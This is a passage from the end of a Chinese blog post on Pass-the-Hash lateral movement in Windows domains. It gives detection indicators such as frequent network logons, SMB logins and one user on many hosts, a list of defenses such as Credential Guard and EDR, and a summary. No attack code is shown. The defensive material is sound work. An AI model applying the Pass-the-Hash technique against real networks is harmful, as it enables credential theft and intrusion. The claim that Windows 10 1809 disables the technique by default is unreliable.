+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>• Event ID 4624：登录类型 3（网络）异常频繁
+</span></span><span class=line><span class=cl>• 非域控主机出现大量 SMB 登录
+</span></span><span class=line><span class=cl>• 同一用户在多台主机短时间登录
+</span></span></code></pre></td></tr></table></div></div><h2 id=八防御>八、防御</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>1. 启用 Credential Guard（虚拟隔离 LSASS，防内存提取）
+</span></span><span class=line><span class=cl>2. 限制 SMB 直连：网络层 ACL 禁止域成员机互连 SMB
+</span></span><span class=line><span class=cl>3. 部署 EDR（检测凭据窃取行为）
+</span></span><span class=line><span class=cl>4. 使用 Kerberos 约束委派替代 NTLM
+</span></span><span class=line><span class=cl>5. Windows 10 1809+ 默认禁用 Pass-the-Hash（需破解 hash）
+</span></span></code></pre></td></tr></table></div></div><h2 id=九小结>九、小结</h2><p>Pass-the-Hash 的本质是"NT hash 在域内可传递"。掌握它的关键是理解：一台主机的 hash = 同域所有主机的通行证。防守核心是 Credential Guard + EDR + 网络隔离。</p></section><footer class=article-footer><section class=article-tags><a href=/tags/pass-the-hash/>Pass-the-Hash</a>
+<a href=/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/>横向移动</a>
+<a href=/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/>域渗透</a>
+<a href=/tags/nt-hash/>NT Hash</a>
+<a href=/tags/psexec/>Psexec</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>本站使用「署名 4.0 国际」创作共享协议，可自由转载、引用，但需署名作者且注明文章出处</span></section><section class=article-lastmod><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<span>最后更新于 Aug 30, 2026 09:00 +0800</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>相关文章</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/751088084/><div class=article-details><h2 class=article-title>内网横向移动技术全景</h2></div></a></article><article><a href=/p/751088108/><div class=article-details><h2 class=article-title>内网多级代理实战：纵深穿透代理链（SSH ProxyJump / frp 级联 / EW 串联）</h2></div></a></article><article><a href=/p/751088037/><div class=article-details><h2 class=article-title>内网渗透：信息收集与存活主机探测</h2></div></a></article><article><a href=/p/751088105/><div class=article-details><h2 class=article-title>SSH 隧道与内网代理（本地/远程/动态转发实战详解）</h2></div></a></article><article><a href=/p/751088083/><div class=article-details><h2 class=article-title>Linux 提权深入：脏牛等内核漏洞</h2></div></a></article></div></div></aside><script src=https://giscus.app/client.js data-repo=SoulJian03/souljian-blog data-repo-id=R_kgDOOckFZw data-category=Genera data-category-id=DIC_kwDOOckFZ84CpSF1 data-mapping=title data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=en data-loading crossorigin=anonymous async></script><script>function setGiscusTheme(e){let t=document.querySelector("iframe.giscus-frame");t&&t.contentWindow.postMessage({giscus:{setConfig:{theme:e}}},"https://giscus.app")}(function(){addEventListener("message",t=>{if(event.origin!=="https://giscus.app")return;e()}),window.addEventListener("onColorSchemeChange",e);function e(){setGiscusTheme(document.documentElement.dataset.scheme==="light"?"light":"gruvbox")}})()</script><footer class=site-footer><div class=footer-container><div class=footer-left><div class=copyright>&copy;
 2020 -
 2026 SoulJian小站</div><div class=busuanzi-count><script async src=//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js></script><span class=site-uv title=访客数><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="visitor-icon"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
 <span id=busuanzi_value_site_uv></span>
